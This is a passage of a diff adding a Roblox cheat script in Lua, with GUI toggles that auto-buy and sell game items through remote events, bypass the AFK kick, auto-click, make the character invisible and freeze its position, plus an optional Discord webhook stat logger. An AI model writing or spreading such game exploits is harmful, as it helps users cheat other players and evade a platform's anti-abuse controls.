+                                            [1] = "SellMuscle"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                                    lastSellTime = tick() -- Reset timer after selling
+                                end
+                                task.wait(0.1) -- Small wait to prevent unnecessary CPU usage
+                            end
+                        end)
+                    end
+                end
+            end
+        })
+        
+        
+        local Toggle = MainTab:CreateToggle({
+            Name = "Auto buy Weight",
+            CurrentValue = false,
+            Flag = "Toggle4",
+            Callback = function(Value)
+                getgenv().BuyWeight = Value
+                while getgenv().BuyWeight do
+                    -- Get the player's backpack
+                    local player = game.Players.LocalPlayer
+                    local backpack = player.Backpack
+        
+                    -- Define the weight progression
+                    local weightOrder = {
+                        "Pencil", "Stick", "Mouse", "Water", "Soccer Ball", "Bottle", "Textbook",
+                        "Bucket", "Wood", "Guitar", "Unavailable", "Chair", "Cart", "TV", 
+                        "Bicycle", "Desk", "Bed", "Log", "Canoe", "Tyre", "Refrigerator", "Drum",
+                        "Hydrant", "Piano", "Motorcycle", "Safe", "Flag", "ATM", "RX-7", "EVO",
+                        "G-Class", "Van", "Tree", "Container", "Sailboat", "Bus", "Truck", "Windmill",
+                        "Jet", "Tank", "Transport Helicopter", "Battleship", "Spaceship", "Speaker",
+                        "Anchor", "Old House", "Building", "Toxic Tank", "Rocket", "Castle",
+                        "Torpedo", "Signal Tower", "Stone Altar", "UFO", "Ancient Place", "Pyramid",
+                        "Canyon Mt.", "Mountain", "Volcano", "Mt. Fuji", "Meteorite", "Moon",
+                        "Mercury", "Mars", "Saturn", "Jupiter", "SUPER Saturn", "Sedna Bar", "Sun",
+                        "Mini Galaxy", "Earth Bar", "Black Hole", "Four Dimensions", "Sun Bar", 
+                        "Holy Star", "Meteoroids Ring", "Meteor Bar", "Water Sphere", "SUPER Meteorite",
+                        "Cross Stars", "Fiery Star", "SUPER Venus", "Atomic Suns", "Lightning Cube",
+                        "Atmosphere", "Five Dimensions", "Space Stone", "Universe", "Mind Stone",
+                        "Reality Stone", "Soul Stone", "Time Stone", "Power Stone", "Cosmo Bar",
+                        "Galaxy Bar", "Universe Bar", "Sharkupiter", "Giftune", "Aurora Way", "Eternity",
+                        "Cashensione", "Past", "Future", "Infection", "Mutation", "Godly 1st Class",
+                        "Godly 2nd Class", "Godly 3rd Class", "Godly 4th Class", "Godly 5th Class",
+                        "Godly 6th Class", "Godly 7th Class", "Godly 8th Class", "Godly 9th Class", 
+                        "1ST SUPER CLASS", "2ND SUPER CLASS", "3RD SUPER CLASS", "4TH SUPER CLASS",
+                        "5TH SUPER CLASS", "6TH SUPER CLASS", "7TH SUPER CLASS", " 8TH SUPER CLASS",
+                        "9TH SUPER CLASS", "10TH SUPER CLASS", "11TH SUPER CLASS", "1ST  ULTIMATE CLASS",
+                        "2ND ULTIMATE CLASS", "3RD ULTIMATE CLASS", "4TH  ULTIMATE CLASS", 
+                        "5TH ULTIMATE CLASS", "6TH ULTIMATE CLASS", "ULTIMATE 7TH CLASS", 
+                        "8TH ULTIMATE CLASS", "9TH ULTIMATE CLASS", "1ST SUPREME CLASS", 
+                        "2ND SUPREME CLASS", "3RD SUPREME CLASS", "4TH SUPREME CLASS", "5TH SUPREME CLASS",
+                        "6TH SUPREME CLASS", "7TH SUPREME CLASS", "8TH SUPREME CLASS", "9TH SUPREME CLASS"
+                    }
+        
+                    -- Find the highest weight the player has
+                    local highestWeightIndex = 0
+                    for i, weightName in ipairs(weightOrder) do
+                        if backpack:FindFirstChild(weightName) then
+                            highestWeightIndex = i
+                        end
+                    end
+        
+                    -- Determine the next weight to buy
+                    local nextWeightIndex = highestWeightIndex + 1
+        
+                    -- Skip "Unavailable" entry
+                    while weightOrder[nextWeightIndex] == "Unavailable" do
+                        nextWeightIndex = nextWeightIndex + 1
+                    end
+        
+                    if nextWeightIndex > #weightOrder then
+                        print("Player has all weights!")
+                        return
+                    end
+        
+                    -- Buy the next weight
+                    print("Attempting to buy weight index: ", nextWeightIndex)
+                    local args = {
+                        [1] = {"BuyItem", "Income_Item", "Weight", nextWeightIndex}
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+        
+                    task.wait(1) -- Adjust delay as needed
+                end
+            end
+        })
+         
+        
+         local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        
+         local Toggle = MainTab:CreateToggle({
+            Name = "Auto Body Alter",
+            CurrentValue = false,
+            Flag = "Toggle5", 
+            Callback = function(Value)
+                getgenv().BuyAlter = Value
+        
+                while getgenv().BuyAlter do
+                    for i = 1, 30 do
+                        if not getgenv().BuyAlter then break end -- Exit loop if toggle is off
+        
+                        local args = {
+                            [1] = {
+                                [1] = "BuyItem",
+                                [2] = "Rebirth_Item",
+                                [3] = "Rebirth1",
+                                [4] = i
+                            }
+                        }
+        
+                        ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                        wait(0.1) -- Prevents excessive requests
+                    end
+                    wait(5) -- Delay to prevent spamming the loop after the for loop completes
+                end
+            end
+        })
+        
+        
+        local Toggle = MainTab:CreateToggle({
+            Name = "Smart Weight",
+            CurrentValue = false,
+            Flag = "Toggle6",
+            Callback = function(Value)
+                getgenv().BuyWeight = Value
+        
+                if Value then
+                    task.spawn(function()
+                        while getgenv().BuyWeight do  
+                            -- Ensure leaderstats and Stage exist
+                            if not player.leaderstats or not player.leaderstats:FindFirstChild("Stage") then
+                                warn("Stage not found in leaderstats!")
+                                return
+                            end
+        
+                            local stage = player.leaderstats.Stage.Value
+                            local maxWeight = 21  -- Default max weight for Stage 0
+        
+                            -- Define max weight based on the player's stage
+                            if stage == 1 then maxWeight = 27
+                            elseif stage == 2 then maxWeight = 32
+                            elseif stage == 3 then maxWeight = 37
+                            elseif stage == 4 then maxWeight = 41
+                            elseif stage == 5 then maxWeight = 46
+                            elseif stage == 6 then maxWeight = 51
+                            elseif stage == 7 then maxWeight = 56
+                            elseif stage == 8 then maxWeight = 61
+                            elseif stage == 9 then maxWeight = 64
+                            elseif stage == 10 then maxWeight = 69
+                            elseif stage == 11 then maxWeight = 72
+                            elseif stage == 12 then maxWeight = 75
+                            elseif stage == 13 then maxWeight = 78
+                            elseif stage == 14 then maxWeight = 81
+                            elseif stage == 15 then maxWeight = 84
+                            elseif stage == 16 then maxWeight = 87
+                            elseif stage == 17 then maxWeight = 90
+                            elseif stage == 18 then maxWeight = 93
+                            elseif stage == 19 then maxWeight = 96
+                            elseif stage == 20 then maxWeight = 99
+                            elseif stage == 21 then maxWeight = 102
+                            elseif stage == 22 then maxWeight = 105
+                            elseif stage == 23 then maxWeight = 108
+                            elseif stage == 24 then maxWeight = 111
+                            elseif stage == 25 then maxWeight = 114
+                            elseif stage == 26 then maxWeight = 120
+                            elseif stage == 27 then maxWeight = 126
+                            elseif stage == 28 then maxWeight = 132
+                            elseif stage == 29 then maxWeight = 138
+                            elseif stage > 30 then maxWeight = 144 -- Example for high-stage players
+                            end
+        
+                            -- Buy weights up to maxWeight
+                            for i = 2, maxWeight do
+                                if not getgenv().BuyWeight then return end
+        
+                                print("Attempting to buy weight: ", i)
+                                local args = {
+                                    [1] = {"BuyItem", "Income_Item", "Weight", i}
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                                task.wait(0.1)
+                            end
+        
+                            task.wait(1) -- Delay before the next cycle
+                        end
+                    end)
+                end
+            end
+        })
+        
+        local player = game.Players.LocalPlayer
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        
+        local Toggle = MainTab:CreateToggle({
+            Name = "Smart DNA",
+            CurrentValue = false,
+            Flag = "Toggle7",
+            Callback = function(Value)
+                getgenv().BuyDNA = Value
+        
+                if Value then
+                    task.spawn(function()  -- Runs in a separate thread
+                        while getgenv().BuyDNA do
+                            -- Get player's current stage
+                            local stage = player.leaderstats:FindFirstChild("Stage") and player.leaderstats.Stage.Value or 0
+        
+                            -- Set max DNA purchase limit based on stage
+                            local maxDNA = 12
+                            if stage == 1 then maxDNA = 16
+                            elseif stage == 2 then maxDNA = 18
+                            elseif stage == 3 then maxDNA = 37
+                            elseif stage == 4 then maxDNA = 41
+                            elseif stage == 5 then maxDNA = 24
+                            elseif stage == 6 then maxDNA = 28
+                            elseif stage == 7 then maxDNA = 30
+                            elseif stage == 8 then maxDNA = 32
+                            elseif stage == 9 then maxDNA = 37
+                            elseif stage == 10 then maxDNA = 39
+                            elseif stage == 11 then maxDNA = 43
+                            elseif stage == 12 then maxDNA = 44
+                            elseif stage == 13 then maxDNA = 44
+                            elseif stage == 14 then maxDNA = 45
+                            elseif stage == 15 then maxDNA = 46
+                            elseif stage == 16 then maxDNA = 48
+                            elseif stage == 17 then maxDNA = 49
+                            elseif stage == 18 then maxDNA = 50
+                            elseif stage == 19 then maxDNA = 51
+                            elseif stage == 20 then maxDNA = 51
+                            elseif stage == 21 then maxDNA = 52
+                            elseif stage == 22 then maxDNA = 52
+                            elseif stage == 23 then maxDNA = 53
+                            elseif stage == 24 then maxDNA = 55
+                            elseif stage == 25 then maxDNA = 56
+                            elseif stage == 26 then maxDNA = 58
+                            elseif stage == 27 then maxDNA = 60
+                            elseif stage == 28 then maxDNA = 62
+                            elseif stage == 29 then maxDNA = 64
+                            elseif stage > 30 then maxDNA = 70
+                            end
+        
+                            -- Loop through and buy DNA up to maxDNA
+                            for i = 1, maxDNA do
+                                if not getgenv().BuyDNA then return end -- Stops instantly
+        
+                                local args = {
+                                    [1] = {
+                                        [1] = "BuyItem",
+                                        [2] = "Bag_Item",
+                                        [3] = "DNA name",
+                                        [4] = i
+                                    }
+                                }
+        
+                                ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                                task.wait(0.1)
+                            end
+                            task.wait(1)
+                        end
+                    end)
+                end
+            end
+        })
+        
+        -- AUto Equip Weight
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        
+        getgenv().AutoEquip = false
+        getgenv().SelectedTool = "None"
+        
+        -- Function to gather all tools from the backpack
+        local function getToolsList()
+            local inventory = LocalPlayer:FindFirstChildOfClass("Backpack")
+            local tools = {"None"} -- Add 'None' option
+            
+            if inventory then
+                for _, item in ipairs(inventory:GetChildren()) do
+                    if item:IsA("Tool") then
+                        table.insert(tools, item.Name)
+                    end
+                end
+            end
+            return tools
+        end
+        
+        -- Equip selected tool
+        local function equipTool(selectedTool)
+            if not LocalPlayer.Character then return end
+            if selectedTool == "None" then return end -- Skip if 'None' is selected
+            
+            local inventory = LocalPlayer:FindFirstChildOfClass("Backpack")
+            
+            if inventory then
+                local tool = inventory:FindFirstChild(selectedTool)
+                if tool and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+                    LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
+                end
+            end
+        end
+        
+        -- Create dropdown menu
+        local Dropdown = SetTab:CreateDropdown({ 
+           Name = "Auto Equip Item", 
+           Options = getToolsList(),
+           CurrentOption = {"None"},
+           MultipleOptions = false,
+           Flag = "Dropdown3",
+           Callback = function(Options)
+               getgenv().AutoEquip = true
+               getgenv().SelectedTool = Options[1] -- Store the selected tool
+               
+               task.spawn(function()
+                   while getgenv().AutoEquip do
+                       if getgenv().SelectedTool ~= "None" then
+                           equipTool(getgenv().SelectedTool)
+                       end
+                       task.wait() -- Rechecks every 10 seconds
+                   end
+               end)
+           end,
+        })
+        
+        -- Refresh the dropdown when the backpack updates
+        LocalPlayer.Backpack.ChildAdded:Connect(function()
+            Dropdown:SetOptions(getToolsList())
+        end)
+        
+        LocalPlayer.Backpack.ChildRemoved:Connect(function()
+            Dropdown:SetOptions(getToolsList())
+        end)
+
+
+        
+        
+        local Toggle = SetTab:CreateToggle({
+            Name = "Anti AFK KICK",
+            CurrentValue = false,
+            Flag = "Toggle8",
+            Callback = function(Value)
+                getgenv().antiafk = Value
+        
+                if Value then
+                    -- Run Anti-AFK logic only once
+                    local Players = game:GetService("Players")
+                    local VirtualUser = game:GetService("VirtualUser")
+        
+                    local GC = getconnections or get_signal_cons
+                    if GC then
+                        for i, v in pairs(GC(Players.LocalPlayer.Idled)) do
+                            if v.Disable then
+                                v:Disable()
+                            elseif v.Disconnect then
+                                v:Disconnect()
+                            end
+                        end
+                    else
+                        Players.LocalPlayer.Idled:Connect(function()
+                            VirtualUser:CaptureController()
+                            VirtualUser:ClickButton2(Vector2.new())
+                        end)
+                    end
+        
+                    -- Run a controlled loop with delays
+                    task.spawn(function()
+                        while getgenv().antiafk do
+                            VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+                            task.wait(1)
+                            VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+                            task.wait(900) -- Wait before repeating
+                        end
+                    end)
+                end
+            end
+        })
+        
+        
+        local Toggle = SetTab:CreateToggle({
+            Name = "Auto Clicker Bloodline",
+            CurrentValue = false,
+            Flag = "Toggle9", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+            Callback = function(Value)
+                getgenv().CLick = Value
+                while CLick == true do
+                        game:GetService("VirtualUser"):ClickButton1(Vector2.new(9e9, 9e9))
+                        wait(12)
+                    end
+                end,
+         })
+        
+         local Toggle = SetTab:CreateToggle({
+            Name = "Auto Clicker Killstreak",
+            CurrentValue = false,
+            Flag = "Toggle10", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+            Callback = function(Value)
+                getgenv().CLick = Value
+                while CLick == true do
+                        game:GetService("VirtualUser"):ClickButton1(Vector2.new(9e9, 9e9))
+                        wait(5)
+                    end
+                end,
+         })
+        
+         local Toggle = SetTab:CreateToggle({
+            Name = "Auto Clicker fast",
+            CurrentValue = false,
+            Flag = "Toggle11", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+            Callback = function(Value)
+                getgenv().CLick = Value
+                while CLick == true do
+                        game:GetService("VirtualUser"):ClickButton1(Vector2.new(9e9, 9e9))
+                        task.wait()
+                    end
+                end,
+         })
+        
+         local Toggle = SetTab:CreateToggle({
+            Name = "White Screen",
+            CurrentValue = false,
+            Flag = "Toggle12", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+            Callback = function(Value)
+                getgenv()WS = Value
+                if WS == true then
+                    game:GetService("RunService"):Set3dRenderingEnabled(false)
+                    elseif WS == false then
+                        game:GetService("RunService"):Set3dRenderingEnabled(true)
+                end
+            end,
+         })
+        
+         local ScreenGui = nil  -- Store the ScreenGui so we can toggle it on/off
+        
+        local Toggle = SetTab:CreateToggle({
+            Name = "Black Screen",
+            CurrentValue = false,
+            Flag = "Toggle13",
+            Callback = function(Value)
+                if Value then
+                    -- Create the black screen if it doesn't exist
+                    if not ScreenGui then
+                        ScreenGui = Instance.new("ScreenGui")
+                        local Frame = Instance.new("Frame")
+        
+                        ScreenGui.Parent = game.CoreGui
+                        ScreenGui.IgnoreGuiInset = true  
+        
+                        Frame.Parent = ScreenGui
+                        Frame.Size = UDim2.new(1, 0, 1, 0)
+                        Frame.Position = UDim2.new(0, 0, 0, 0)
+                        Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+                        Frame.BorderSizePixel = 0  
+                    end
+                else
+                    -- Remove the black screen if it exists
+                    if ScreenGui then
+                        ScreenGui:Destroy()
+                        ScreenGui = nil
+                    end
+                end
+            end,
+        })
+        
+        repeat wait() until game:IsLoaded()
+        wait(2)
+        
+        -- Create GUI Elements
+        local ScreenGui = Instance.new("ScreenGui")
+        
+        local Fps = Instance.new("TextLabel")
+        local Ping = Instance.new("TextLabel")
+        
+        -- FPS at the Upper Right (Lowered)
+        Fps.Name = "Fps"
+        Fps.BackgroundTransparency = 1.0
+        Fps.Position = UDim2.new(1, -130, 0, 30) -- Moved down from 5 to 30
+        Fps.Size = UDim2.new(0, 125, 0, 25)
+        Fps.Font = Enum.Font.SourceSans
+        Fps.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Fps.TextScaled = true
+        Fps.Text = ""
+        
+        -- Ping at the Upper Left (Lowered)
+        Ping.Name = "Ping"
+        Ping.BackgroundTransparency = 1.0
+        Ping.Position = UDim2.new(0, 5, 0, 30) -- Moved down from 5 to 30
+        Ping.Size = UDim2.new(0, 125, 0, 25)
+        Ping.Font = Enum.Font.SourceSans
+        Ping.TextColor3 = Color3.fromRGB(253, 253, 253)
+        Ping.TextScaled = true
+        Ping.Text = ""
+        
+        -- Parent AFTER setting properties to avoid "Label"
+        Fps.Parent = ScreenGui
+        Ping.Parent = ScreenGui
+        ScreenGui.Parent = game.CoreGui
+        
+        -- Toggleable FPS & Ping Display
+        local RunService = game:GetService("RunService")
+        getgenv().DisplayStats = false
+        
+        local function UpdateStats()
+            while getgenv().DisplayStats do
+                local fpsValue = math.round(1 / RunService.RenderStepped:Wait())
+                local pingValue = math.round(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
+        
+                Fps.Text = "FPS: " .. fpsValue
+                Ping.Text = "Ping: " .. pingValue
+        
+                task.wait(0.5)
+            end
+        
+            -- Hide text when disabled
+            Fps.Text = ""
+            Ping.Text = ""
+        end
+        
+        -- Toggle UI
+        local Toggle = SetTab:CreateToggle({ 
+            Name = "Show FPS & Ping", 
+            CurrentValue = false,
+            Flag = "Toggle14", 
+            Callback = function(Value)
+                getgenv().DisplayStats = Value
+                if Value then
+                    task.spawn(UpdateStats)
+                end
+            end,
+        })
+        
+        -- Toggle for Destroy Everything (Visual Only)
+        local Toggle = SetTab:CreateToggle({
+            Name = "Destroy Everything",
+            CurrentValue = false,
+            Flag = "Toggle15",
+            Callback = function(Value)
+                getgenv().DestroyEverything = Value
+                if Value then
+                    startDestroy()
+                else
+                    restoreObjects()
+                end
+            end,
+        })
+        
+        local destroyedObjects = {}
+        
+        function startDestroy()
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("BasePart") and not obj:IsDescendantOf(game.Players.LocalPlayer.Character) then
+                    destroyedObjects[obj] = {Transparency = obj.Transparency, Material = obj.Material}
+                    obj.Transparency = 1
+                    obj.Material = Enum.Material.SmoothPlastic
+                elseif obj:IsA("Decal") or obj:IsA("Texture") then
+                    destroyedObjects[obj] = true
+                    obj:Destroy()
+                end
+            end
+        end
+        
+        function restoreObjects()
+            for obj, data in pairs(destroyedObjects) do
+                if obj and obj.Parent then
+                    if typeof(data) == "table" then
+                        obj.Transparency = data.Transparency
+                        obj.Material = data.Material
+                    end
+                end
+            end
+            destroyedObjects = {}
+        end
+        
+        local player = game.Players.LocalPlayer
+        
+        local function setTrueInvisibility(state)
+            local character = player.Character or player.CharacterAdded:Wait()
+            if not character then return end
+        
+            for _, v in pairs(character:GetDescendants()) do
+                if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
+                    v.LocalTransparencyModifier = state and 1 or 0 -- Makes parts invisible
+                    v.CanCollide = not state -- Disables collision
+                    v.CanTouch = not state
+                    v.CanQuery = not state
+                end
+            end
+        
+            if character:FindFirstChild("HumanoidRootPart") then
+                character.HumanoidRootPart.Anchored = state -- Prevents server from detecting movement
+            end
+        end
+        
+        local Toggle = SetTab:CreateToggle({ 
+            Name = "TRUE INVISIBILITY", 
+            CurrentValue = false,
+            Flag = "Toggle16", 
+            Callback = function(Value)
+                setTrueInvisibility(Value)
+            end,
+        })
+        
+        local player = game.Players.LocalPlayer
+        local runService = game:GetService("RunService")
+        
+        -- Get HumanoidRootPart
+        local function getRoot()
+            local character = player.Character or player.CharacterAdded:Wait()
+            return character:WaitForChild("HumanoidRootPart")
+        end
+        
+        local lockedCFrame = nil -- Store the locked position
+        
+        local Toggle = SetTab:CreateToggle({ 
+            Name = "Freeze Position",
+            CurrentValue = false,
+            Flag = "Toggle17",
+            Callback = function(Value)
+                local root = getRoot()
+                if Value then
+                    lockedCFrame = root.CFrame -- Save current position
+                else
+                    lockedCFrame = nil
+                end
+            end,
+        })
+        
+        runService.RenderStepped:Connect(function()
+            local root = getRoot()
+            if lockedCFrame then
+                root.CFrame = lockedCFrame -- Lock position
+            end
+        end)
+        
+        local player = game.Players.LocalPlayer
+        local nameTagHidden = false
+        
+        local function setCustomNameTagVisibility(shouldHide)
+            local character = player.Character or player.CharacterAdded:Wait()
+            local head = character:WaitForChild("Head")
+            
+            local titleGui = head:FindFirstChild("TitleGui")
+            if titleGui then
+                local tlName = titleGui:FindFirstChild("tlName")
+                if tlName and tlName:IsA("TextLabel") then
+                    tlName.Visible = not shouldHide
+                end
+        
+                local tlRank = titleGui:FindFirstChild("tlRank")
+                if tlRank and tlRank:IsA("TextLabel") then
+                    tlRank.Visible = not shouldHide
+                end
+            end
+        end
+        
+        local Toggle = SetTab:CreateToggle({
+            Name = "Hide Info",
+            CurrentValue = false,
+            Flag = "Toggle18",
+            Callback = function(Value)
+                nameTagHidden = Value
+                setCustomNameTagVisibility(Value)
+            end,
+        })
+        
+        -- Only apply when character exists/changes AND toggle is on
+        player.CharacterAdded:Connect(function()
+            if nameTagHidden then
+                setCustomNameTagVisibility(true)
+            end
+        end)
+        
+        if player.Character and nameTagHidden then
+            setCustomNameTagVisibility(true)
+        end
+        
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local blacklist = {"Athena", "Cronus", "Hades", "Hercules", "Poseidon", "Zeus", "Ares", "Fist", "Foot"}
+        
+        getgenv().AutoEquipUnequip = false
+        
+        local function equipTools()
+            if not LocalPlayer.Character then return end
+        
+            local inventory = LocalPlayer:FindFirstChildOfClass("Backpack")
+            if inventory then
+                for _, item in ipairs(inventory:GetChildren()) do
+                    if item:IsA("Tool") and not table.find(blacklist, item.Name) then
+                        LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(item)
+                    end
+                end
+            end
+        end
+        
+        local function unequipTools()
+            if not LocalPlayer.Character then return end
+        
+            local character = LocalPlayer.Character
+            for _, item in ipairs(character:GetChildren()) do
+                if item:IsA("Tool") and not table.find(blacklist, item.Name) then
+                    item.Parent = LocalPlayer:FindFirstChildOfClass("Backpack")
+                end
+            end
+        end
+        
+        local function equipFoot()
+            local inventory = LocalPlayer:FindFirstChildOfClass("Backpack")
+            if inventory then
+                local foot = inventory:FindFirstChild("Foot")
+                if foot and foot:IsA("Tool") then
+                    LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(foot)
+                end
+            end
+        end
+        
+        local Toggle = SetTab:CreateToggle({
+            Name = "Auto Equip/Unequip Weight",
+            CurrentValue = false,
+            Flag = "Toggle19",
+            Callback = function(Value)
+                getgenv().AutoEquipUnequip = Value
+        
+                task.spawn(function()
+                    while AutoEquipUnequip do
+                        equipTools()
+                        task.wait(18)
+        
+                        unequipTools()
+                        task.wait(0.1)
+        
+                        equipFoot()
+                        task.wait(0.5)
+        
+                        unequipTools()
+                        task.wait(0.1)
+                    end
+                end)
+            end,
+        })
+
+        local webhookConnection = nil
+        local webhookGui = nil
+        local webhookURL = nil
+        local shouldSend = false
+        
+        -- Function to send stats (unchanged if already working)
+        local function sendStats()
+            if not webhookURL then return end
+        
+            local player = game:GetService("Players").LocalPlayer
+            local leaderstats = player:WaitForChild("leaderstats")
+            local muscle = leaderstats:FindFirstChild("Muscle") and leaderstats.Muscle.Value or 0
+            local stage = leaderstats:FindFirstChild("Stage") and leaderstats.Stage.Value or 0
+            local username = player.Name
+            local cashText = player.PlayerGui.Main_Gui.DataMenu_Frame.Cash.Status.Text
+            local displayCash = cashText:gsub("0%.00%s*", "")
+        
+            local muscleDisplay = (muscle == 0) and "Concealed :lock:" or formatBigNumber(muscle)
+        
+            local data = {
+                ["content"] = "**:bust_in_silhouette: Username:** " .. username ..
+                            "\n**:muscle: Muscle Stat:** " .. muscleDisplay ..
+                            "\n**:cyclone: Stage:** " .. stage ..
+                            "\n**:moneybag: Cash:** " .. displayCash,
+                ["username"] = "Stat Logger",
+                ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+            }
+        
+            local headers = {["Content-Type"] = "application/json"}
+            local body = game:GetService("HttpService"):JSONEncode(data)
+        
+            local success, err = pcall(function()
+                http_request({
+                    Url = webhookURL,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = body
+                })
+            end)
+        
+            if not success then
+                warn("Failed to send webhook:", err)
+            else
+                print("Webhook sent successfully!")
+            end
+        end
+        
+        -- Function to start the webhook timer loop
+        local function startWebhookLoop()
+            if webhookConnection then
+                webhookConnection:Disconnect()
+            end
+        
+            _G._lastSend = 0
+            webhookConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                if shouldSend and webhookURL and tick() - _G._lastSend >= 600 then -- every 10 minutes
+                    _G._lastSend = tick()
+                    sendStats()
+                end
+            end)
+        end
+        
+        -- Function to create the GUI and handle input
+        local function createWebhookGui()
+            local screenGui = Instance.new("ScreenGui")
+            screenGui.Name = "WebhookInputGui"
+            screenGui.ResetOnSpawn = false
+            screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+            webhookGui = screenGui
+        
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(0, 400, 0, 150)
+            frame.Position = UDim2.new(0.5, -200, 0.5, -75)
+            frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+            frame.AnchorPoint = Vector2.new(0.5, 0.5)
+            frame.Active = true
+            frame.Draggable = true
+            frame.Parent = screenGui
+        
+            local uiCorner = Instance.new("UICorner")
+            uiCorner.CornerRadius = UDim.new(0, 10)
+            uiCorner.Parent = frame
+        
+            local textBox = Instance.new("TextBox")
+            textBox.PlaceholderText = "Enter your Discord webhook URL"
+            textBox.Size = UDim2.new(1, -40, 0, 40)
+            textBox.Position = UDim2.new(0, 20, 0, 20)
+            textBox.Text = ""
+            textBox.TextColor3 = Color3.new(1, 1, 1)
+            textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+            textBox.ClearTextOnFocus = false
+            textBox.Parent = frame
+        
+            local submitButton = Instance.new("TextButton")
+            submitButton.Text = "Set Webhook"
+            submitButton.Size = UDim2.new(1, -40, 0, 35)
+            submitButton.Position = UDim2.new(0, 20, 0, 75)
+            submitButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+            submitButton.TextColor3 = Color3.new(1, 1, 1)
+            submitButton.Parent = frame
+        
+            -- Button logic
+            submitButton.MouseButton1Click:Connect(function()
+                if textBox.Text ~= "" then
+                    webhookURL = textBox.Text
+                    print("Webhook URL set to:", webhookURL)
+                    screenGui:Destroy()
+                    startWebhookLoop()
+                end
+            end)
+        end
+        
+        -- Finally — your toggle
+        local Toggle = SetTab:CreateToggle({
+            Name = "Enable Webhook Logger",
+            CurrentValue = false,
+            Flag = "WebhookToggle",
+            Callback = function(Value)
+                shouldSend = Value
+                if shouldSend then
+                    createWebhookGui()
+                else
+                    -- stop everything
+                    if webhookConnection then
+                        webhookConnection:Disconnect()
+                        webhookConnection = nil
+                    end
+                    if webhookGui then
+                        webhookGui:Destroy()
+                        webhookGui = nil
+                    end
+                    webhookURL = nil
+                end
+            end,
+        })
+        
+        
+        local Button = SetTab:CreateButton({
+            Name = "Click For a Surprise",
+            Callback = function()
+                local player = game.Players.LocalPlayer
+                local starterGui = game:GetService("StarterGui")
+                
+                -- Display fake ban message
+                starterGui:SetCore("SendNotification", {
+                    Title = "Surprise!!",
+                    Text = "The Developers know\nWhat you're doing!",
+                    Duration = 3
+                })
+                
+                -- Wait 3 seconds, then change the message
+                task.wait(2)
+        
+                starterGui:SetCore("SendNotification", {
+                    Title = "BANNING INCOMING",
+                    Text = "3",
+                    Duration = 1.1
+                })
+        
+                task.wait(1.2)
+        
+                starterGui:SetCore("SendNotification", {
+                    Title = "BANNING INCOMING",
+                    Text = "2",
+                    Duration = 1.1
+                })
+        
+                task.wait(1.2)
+        
+                starterGui:SetCore("SendNotification", {
+                    Title = "BANNING INCOMING",
+                    Text = "1",
+                    Duration = 1.1
+                })
+        
+                -- Kick the player after showing the fake ban
+                task.wait(1) -- Give a slight delay before kicking
+                player:Kick("YOU HAVE BEEN BANNED! EXPLOITS DETECTED!")
+            end,
+        })
+
+        
+        
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local Camera = workspace.CurrentCamera
+        local UserInputService = game:GetService("UserInputService")
+        
+        -- Create the GUI (hidden by default)
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Parent = game.CoreGui
+        
+        local Frame = Instance.new("Frame")
+        Frame.Size = UDim2.new(0, 150, 0, 150)
+        Frame.Position = UDim2.new(0.5, -75, 0, 20) -- Top middle with 20px margin
+        Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        Frame.BackgroundTransparency = 0.5
+        Frame.BorderSizePixel = 0
+        Frame.AnchorPoint = Vector2.new(0.5, 0) -- Anchored to top center
+        Frame.Visible = false -- Start hidden
+        Frame.Active = true -- Required for dragging
+        Frame.Draggable = true -- Make draggable
+        Frame.Parent = ScreenGui
+        
+        local UICorner = Instance.new("UICorner")
+        UICorner.CornerRadius = UDim.new(1, 0) -- Perfect circle
+        UICorner.Parent = Frame
+        
+        local CurrentPlayer = Instance.new("TextLabel")
+        CurrentPlayer.Size = UDim2.new(0.8, 0, 0.25, 0)
+        CurrentPlayer.Position = UDim2.new(0.1, 0, 0.375, 0) -- Centered vertically
+        CurrentPlayer.BackgroundTransparency = 1
+        CurrentPlayer.Text = "YOU"
+        CurrentPlayer.TextColor3 = Color3.new(1, 1, 1)
+        CurrentPlayer.Font = Enum.Font.GothamBold
+        CurrentPlayer.TextSize = 16
+        CurrentPlayer.TextScaled = true -- Auto-scales long names
